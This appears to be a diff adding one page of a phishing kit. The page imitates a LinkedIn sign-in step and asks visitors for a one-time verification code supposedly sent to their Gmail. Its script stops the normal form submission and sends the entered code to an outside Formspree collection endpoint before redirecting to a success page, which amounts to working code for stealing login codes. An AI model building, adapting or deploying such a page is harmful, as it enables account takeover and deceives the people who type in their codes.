@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login</title>
+  <title>Sign In with Linkedin.</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; }
+        .container { max-width: 400px; margin: 100px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h2 { text-align: center; }
+        input[type="email"], input[type="password"], input[type="text"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 10px; background: #0077b5; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #005582; }
+        .otp-section { display: none; }
+    .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 0px;
+            
+        }
+       p{
+            font-size: 13px;
+       }
+        .logo {
+            width: 150px;
+            margin: 0px auto;
+        }
+      @media (max-width: 600px) {
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .logo {
+                margin-bottom: 0px;
+            }
+        }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+         <img src="logo.png" alt="Company Logo" class="logo">
+  </div>
+  <p>An OTP Varification Code was sent your gmail. Please, check your inbox and put this OTP here.</p>
+        <form id="loginForm">
+    <input type="password" id="password" name="message" placeholder="Enter OTP here..." required>
+    <button type="submit">Submit</button>
+    <p><a href="otp.html">Send code again?</a></p>
+    <p> <a href="login.html">Try other way...</a></p>
+</form>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault(); // Stop default form submission
+
+    const form = e.target;
+    const formData = new FormData(form);
+
+    fetch('https://formspree.io/f/mnndnbvr', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+    }).then(function(response) {
+        if (response.ok) {
+            window.location.href = "success.html"; // Redirect after successful submission
+        } else {
+            alert('Form submission failed. Please try again.');
+        }
+    }).catch(function(error) {
+        alert('There was an error. Please try again.');
+    });
+});
+</script>
+</div>
+
+</body>
+</html>
